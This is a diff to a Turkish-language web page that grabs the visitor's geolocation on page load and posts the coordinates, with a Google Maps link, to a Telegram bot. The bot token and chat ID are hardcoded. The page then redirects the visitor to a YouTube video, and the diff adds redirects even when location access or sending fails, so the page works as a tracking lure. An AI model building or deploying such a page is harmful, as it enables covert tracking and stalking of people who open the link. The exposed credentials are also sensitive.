@@ -2,16 +2,17 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8">
-  <title>Konum Gönderici</title>
+  <title>Konum Gönderiliyor...</title>
 </head>
 <body>
-  <h2>📡 Konumun gönderiliyor...</h2>
+  <h2>📡 Konumun gönderiliyor, lütfen bekle...</h2>
 
   <script>
     function sendLocationToTelegram(lat, lon) {
       const chatID = "8499614707";
       const token = "8103906170:AAFLQZ3RE499VbqoOoGUMDnWiUPxXFwvHsg";
-      const message = `📍 Yeni konum bilgisi alındı:\n🧭 Enlem: ${lat}\n🧭 Boylam: ${lon}\n\n📌 Haritada görmek için:\nhttps://www.google.com/maps?q=${lat},${lon}`;
+      const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+      const message = `📍 Yeni konum bilgisi alındı:\n🧭 Enlem: ${lat}\n🧭 Boylam: ${lon}\n\n📌 Haritada görmek için:\n${mapsLink}`;
 
       const url = `https://api.telegram.org/bot${token}/sendMessage`;
       const body = `chat_id=${chatID}&text=${encodeURIComponent(message)}`;
@@ -21,8 +22,12 @@
         headers: { "Content-Type": "application/x-www-form-urlencoded" },
         body: body
       }).then(() => {
-        // Konum gönderildikten sonra YouTube'a yönlendir
-        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // Senin daha önce verdiğin bağlantı
+        // Konum gönderildi → YouTube’a yönlendir
+        window.location.href = "https://www.youtube.com/watch?v=NqdOVT1IKPA";
+      }).catch(err => {
+        alert("Telegram gönderimi başarısız: " + err.message);
+        // Hata olsa bile yine yönlendirme yapılır
+        window.location.href = "https://www.youtube.com/watch?v=NqdOVT1IKPA";
       });
     }
 
@@ -30,6 +35,9 @@
       const lat = pos.coords.latitude.toFixed(6);
       const lon = pos.coords.longitude.toFixed(6);
       sendLocationToTelegram(lat, lon);
+    }, err => {
+      alert("Konum alınamadı: " + err.message);
+      window.location.href = "https://www.youtube.com/watch?v=NqdOVT1IKPA";
     });
   </script>
 </body>
